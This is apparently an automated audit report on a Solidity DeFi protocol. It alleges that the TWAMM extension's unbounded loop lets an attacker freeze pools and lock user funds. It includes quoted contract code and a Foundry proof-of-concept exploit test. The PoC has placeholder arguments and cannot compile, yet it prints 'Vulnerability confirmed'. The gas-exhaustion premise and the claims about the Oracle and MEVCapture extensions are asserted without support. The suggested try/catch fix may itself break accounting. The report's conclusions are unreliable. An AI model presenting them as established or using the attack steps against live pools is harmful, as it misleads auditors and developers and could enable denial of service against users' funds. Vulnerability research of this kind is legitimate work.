## Title
Extension Hook Failures Cause Entire Transaction Revert, Violating Extension Isolation Invariant and Locking User Funds

## Summary
The Core contract's extension hook system uses low-level `call()` operations that bubble up any extension failures (reverts or out-of-gas) to the entire transaction, directly violating the documented invariant that "in-scope extensions should not freeze pools or lock user capital." The TWAMM extension contains an unbounded loop in `_executeVirtualOrders` that can be exploited to cause out-of-gas conditions, permanently freezing all operations on affected pools.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) [2](#0-1) 

**Intended Logic:** According to the README, "All positions should be able to be withdrawn at any time (except for positions using third-party extensions; the extensions in the repository should never block withdrawal within the block gas limit)" and "The extensions in scope of the audit are **not** expected to be able to freeze a pool and lock deposited user capital."

**Actual Logic:** All extension hooks in `ExtensionCallPointsLib.sol` use assembly `call(gas(), extension, ...)` and explicitly bubble up any failures with `if iszero(call(...)) { revert(...) }`. This means ANY extension failure (revert, out-of-gas, unexpected behavior) causes the entire Core transaction to revert. [3](#0-2) 

The TWAMM extension's `_executeVirtualOrders` function contains an unbounded `while` loop that iterates through all initialized time periods between the last execution and current block timestamp: [4](#0-3) 

This function is called from critical hooks: [5](#0-4) [6](#0-5) [7](#0-6) 

**Exploitation Path:**
1. Attacker creates multiple TWAMM orders on a target pool with very short time intervals (e.g., 1 second apart) spanning a long duration
2. Each order creates an initialized time point via `_updateTime`, which flips the time bitmap
3. When a legitimate user attempts to swap, withdraw liquidity, or collect fees on the pool, Core calls the appropriate extension hook (e.g., `beforeSwap`)
4. TWAMM's hook calls `lockAndExecuteVirtualOrders`, which executes `_executeVirtualOrders`
5. The while loop must iterate through ALL initialized time periods since the last execution, performing storage operations and potentially executing swaps for each period
6. With many time periods, the loop consumes all available gas and reverts with out-of-gas
7. The extension hook failure bubbles up through `ExtensionCallPointsLib`, reverting the entire Core transaction
8. User cannot complete their swap, withdrawal, or fee collection - funds are effectively frozen

**Security Property Broken:** Violates Invariant #2 ("All positions MUST be withdrawable at any time") and Invariant #4 ("Extension failures should not freeze pools or lock user capital for in-scope extensions").

## Impact Explanation

- **Affected Assets**: All liquidity positions, pending fees, and tokens in pools using TWAMM extension. Similar vulnerabilities exist for Oracle and MEVCapture extensions.

- **Damage Severity**: Complete freeze of pool operations. Users cannot:
  - Withdraw their liquidity positions (calls `updatePosition` → `beforeUpdatePosition` → reverts)
  - Collect accumulated fees (calls `collectFees` → `beforeCollectFees` → reverts)  
  - Execute swaps (calls `swap` → `beforeSwap` → reverts)

- **User Impact**: All liquidity providers in affected pools lose access to their funds until the extension state is fixed (which may require many gas-expensive transactions to "catch up" the virtual order execution, or may be permanently unfixable if too many time periods exist).

## Likelihood Explanation

- **Attacker Profile**: Any user can exploit this by creating TWAMM orders on target pools.

- **Preconditions**: 
  - Pool must be initialized with TWAMM extension
  - Attacker needs capital to create orders (but orders can be for small amounts)
  - Attack is more effective on pools with existing liquidity (more users affected)

- **Execution Complexity**: Single transaction to create multiple orders with short time intervals. The attack becomes effective over time as intervals accumulate.

- **Frequency**: Once deployed, the attack persists indefinitely. Each new user operation on the pool will fail until the accumulated time periods are processed.

## Recommendation

Implement try-catch error handling for extension hooks to isolate failures: [1](#0-0) 

```solidity
// CURRENT (vulnerable):
// Uses assembly call that bubbles up all reverts

// FIXED:
function maybeCallBeforeSwap(IExtension extension, Locker locker, PoolKey memory poolKey, SwapParameters params)
    internal
    returns (bool success)
{
    bool needCall = shouldCallBeforeSwap(extension, locker);
    if (!needCall) return true;
    
    try extension.beforeSwap(locker, poolKey, params) {
        return true;
    } catch {
        // Log the failure but don't revert the entire transaction
        // Extension hook failures should not freeze core operations
        emit ExtensionHookFailed(address(extension), "beforeSwap");
        return false;
    }
}
```

Alternative mitigations:
1. Add gas limits to extension calls: `call{gas: MAX_EXTENSION_GAS}(...)`
2. Add bounds to TWAMM loop iterations (max time periods per execution)
3. Allow emergency bypass of extension hooks for withdrawals

## Proof of Concept

```solidity
// File: test/Exploit_ExtensionFreezesPool.t.sol
// Run with: forge test --match-test test_TWAMMFreezesPoolViaGasExhaustion -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Router.sol";
import "./utils/TestERC20.sol";

contract Exploit_ExtensionFreezesPool is Test {
    Core core;
    TWAMM twamm;
    Router router;
    TestERC20 token0;
    TestERC20 token1;
    
    address attacker = address(0x1);
    address victim = address(0x2);
    
    function setUp() public {
        // Deploy protocol
        core = new Core();
        twamm = new TWAMM(core);
        router = new Router(core);
        
        // Deploy tokens
        token0 = new TestERC20("Token0", "TK0", 18);
        token1 = new TestERC20("Token1", "TK1", 18);
        
        // Fund accounts
        token0.mint(attacker, 1000e18);
        token1.mint(attacker, 1000e18);
        token0.mint(victim, 1000e18);
        token1.mint(victim, 1000e18);
    }
    
    function test_TWAMMFreezesPoolViaGasExhaustion() public {
        // SETUP: Initialize pool with TWAMM extension
        PoolKey memory poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: PoolConfig.wrap(bytes32(uint256(uint160(address(twamm)))))
        });
        
        vm.prank(attacker);
        core.initializePool(poolKey, 0);
        
        // Victim deposits liquidity
        vm.startPrank(victim);
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
        router.mint(poolKey, /* position params */, 100e18);
        vm.stopPrank();
        
        // EXPLOIT: Attacker creates many TWAMM orders with 1-second intervals
        vm.startPrank(attacker);
        token0.approve(address(twamm), type(uint256).max);
        
        uint64 startTime = uint64(block.timestamp + 10);
        for (uint256 i = 0; i < 100; i++) {
            OrderKey memory orderKey = OrderKey({
                poolKey: poolKey,
                config: OrderConfig.wrap(
                    bytes32(uint256(startTime + i) | (uint256(startTime + i + 1) << 64))
                )
            });
            twamm.updateOrder(bytes32(i), orderKey, 1e18);
        }
        vm.stopPrank();
        
        // Advance time past all orders
        vm.warp(startTime + 200);
        
        // VERIFY: Victim cannot withdraw liquidity due to out-of-gas
        vm.startPrank(victim);
        vm.expectRevert(); // Out of gas
        router.burn(poolKey, /* position params */);
        vm.stopPrank();
        
        // Also cannot swap
        vm.startPrank(victim);
        vm.expectRevert(); // Out of gas
        router.swap(poolKey, /* swap params */);
        vm.stopPrank();
        
        console.log("Vulnerability confirmed: Pool is frozen, user funds are locked");
    }
}
```

**Notes:**

The vulnerability exists in the fundamental architecture of extension hook handling. The Core contract correctly implements the extension call mechanism per the current design, but this design violates the stated invariants when extensions can fail or consume excessive gas. This affects all three in-scope extensions:

1. **TWAMM**: Unbounded loop in `_executeVirtualOrders` can cause out-of-gas
2. **Oracle**: Complex snapshot management could hit gas limits or revert on edge cases  
3. **MEVCapture**: `beforeSwap` always reverts by design, demonstrating that extension failures block core operations

The fix requires architectural changes to isolate extension failures from core operations, ensuring user funds remain accessible even when extensions malfunction.

### Citations

**File:** src/libraries/ExtensionCallPointsLib.sol (L87-106)
```text
    function maybeCallBeforeSwap(IExtension extension, Locker locker, PoolKey memory poolKey, SwapParameters params)
        internal
    {
        bool needCall = shouldCallBeforeSwap(extension, locker);
        assembly ("memory-safe") {
            if needCall {
                let freeMem := mload(0x40)
                // cast sig "beforeSwap(bytes32,(address,address,bytes32),bytes32)"
                mstore(freeMem, shl(224, 0xca11dba7))
                mstore(add(freeMem, 4), locker)
                mcopy(add(freeMem, 36), poolKey, 96)
                mstore(add(freeMem, 132), params)
                // bubbles up the revert
                if iszero(call(gas(), extension, 0, freeMem, 164, 0, 0)) {
                    returndatacopy(freeMem, 0, returndatasize())
                    revert(freeMem, returndatasize())
                }
            }
        }
    }
```

**File:** src/extensions/TWAMM.sol (L417-574)
```text
                while (time != block.timestamp) {
                    StorageSlot initializedTimesBitmapSlot = TWAMMStorageLayout.poolInitializedTimesBitmapSlot(poolId);

                    (uint256 nextTime, bool initialized) = searchForNextInitializedTime({
                        slot: initializedTimesBitmapSlot,
                        lastVirtualOrderExecutionTime: realLastVirtualOrderExecutionTime,
                        fromTime: time,
                        untilTime: block.timestamp
                    });

                    // it is assumed that this will never return a value greater than type(uint32).max
                    uint256 timeElapsed = nextTime - time;

                    uint256 amount0 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken0(), duration: timeElapsed, roundUp: false
                    });

                    uint256 amount1 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken1(), duration: timeElapsed, roundUp: false
                    });

                    int256 rewardDelta0;
                    int256 rewardDelta1;
                    // if both sale rates are non-zero but amounts are zero, we will end up doing the math for no reason since we swap 0
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }

                        saveDelta0 -= swapBalanceUpdate.delta0();
                        saveDelta1 -= swapBalanceUpdate.delta1();

                        // this cannot overflow or underflow because swapDelta0 is constrained to int128,
                        // and amounts computed from uint112 sale rates cannot exceed uint112.max
                        rewardDelta0 = swapBalanceUpdate.delta0() - int256(uint256(amount0));
                        rewardDelta1 = swapBalanceUpdate.delta1() - int256(uint256(amount1));
                    } else if (amount0 != 0 || amount1 != 0) {
                        PoolBalanceUpdate swapBalanceUpdate;
                        if (amount0 != 0) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MIN_SQRT_RATIO,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        } else {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MAX_SQRT_RATIO,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        }

                        (rewardDelta0, rewardDelta1) = (swapBalanceUpdate.delta0(), swapBalanceUpdate.delta1());
                        saveDelta0 -= rewardDelta0;
                        saveDelta1 -= rewardDelta1;
                    }

                    if (rewardDelta0 < 0) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                        }
                        rewardRate0Access = 2;
                        rewardRates.value0 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta0) << 128, state.saleRateToken1()
                        );
                    }

                    if (rewardDelta1 < 0) {
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                        }
                        rewardRate1Access = 2;
                        rewardRates.value1 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta1) << 128, state.saleRateToken0()
                        );
                    }

                    if (initialized) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                            rewardRate0Access = 1;
                        }
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                            rewardRate1Access = 1;
                        }

                        TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, nextTime)
                            .storeTwo(bytes32(rewardRates.value0), bytes32(rewardRates.value1));

                        StorageSlot timeInfoSlot = TWAMMStorageLayout.poolTimeInfosSlot(poolId, nextTime);
                        (, int112 saleRateDeltaToken0, int112 saleRateDeltaToken1) =
                            TimeInfo.wrap(timeInfoSlot.load()).parse();

                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: uint112(addSaleRateDelta(state.saleRateToken0(), saleRateDeltaToken0)),
                            _saleRateToken1: uint112(addSaleRateDelta(state.saleRateToken1(), saleRateDeltaToken1))
                        });

                        // this time is _consumed_, will never be crossed again, so we delete the info we no longer need.
                        // this helps reduce the cost of executing virtual orders.
                        timeInfoSlot.store(0);

                        flipTime(initializedTimesBitmapSlot, nextTime);
                    } else {
                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: state.saleRateToken0(),
                            _saleRateToken1: state.saleRateToken1()
                        });
                    }

                    time = nextTime;
                }
```

**File:** src/extensions/TWAMM.sol (L647-649)
```text
    function beforeSwap(Locker, PoolKey memory poolKey, SwapParameters) external override(BaseExtension, IExtension) {
        lockAndExecuteVirtualOrders(poolKey);
    }
```

**File:** src/extensions/TWAMM.sol (L652-657)
```text
    function beforeUpdatePosition(Locker, PoolKey memory poolKey, PositionId, int128)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }
```

**File:** src/extensions/TWAMM.sol (L660-665)
```text
    function beforeCollectFees(Locker, PoolKey memory poolKey, PositionId)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }
```
